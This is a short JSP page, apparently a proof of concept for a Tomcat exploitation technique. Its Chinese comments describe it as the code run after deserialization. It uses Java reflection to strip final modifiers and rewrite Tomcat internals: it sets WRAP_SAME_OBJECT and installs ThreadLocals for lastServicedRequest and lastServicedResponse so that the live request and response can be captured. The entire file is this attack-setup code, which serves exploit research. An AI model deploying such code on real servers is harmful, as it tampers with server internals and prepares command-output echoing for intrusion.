<%--
  Created by IntelliJ IDEA.
  User: kuroneko
  Date: 2020-06-16
  Time: 14:44
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%
    try {
        /*刚开始反序列化后执行的逻辑*/
        //修改 WRAP_SAME_OBJECT 值为 true
        Class c = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
        java.lang.reflect.Field f = c.getDeclaredField("WRAP_SAME_OBJECT");
        java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
        f.setAccessible(true);
        if (!f.getBoolean(null)) {
            f.setBoolean(null, true);
        }

        //初始化 lastServicedRequest
        c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
        f = c.getDeclaredField("lastServicedRequest");
        modifiersField = f.getClass().getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
        f.setAccessible(true);
        if (f.get(null) == null) {
            f.set(null, new ThreadLocal());
        }

        //初始化 lastServicedResponse
        f = c.getDeclaredField("lastServicedResponse");
        modifiersField = f.getClass().getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
        f.setAccessible(true);
        if (f.get(null) == null) {
            f.set(null, new ThreadLocal());
        }
    } catch (Exception e) {
        e.printStackTrace();
    }

%>
</body>
</html>
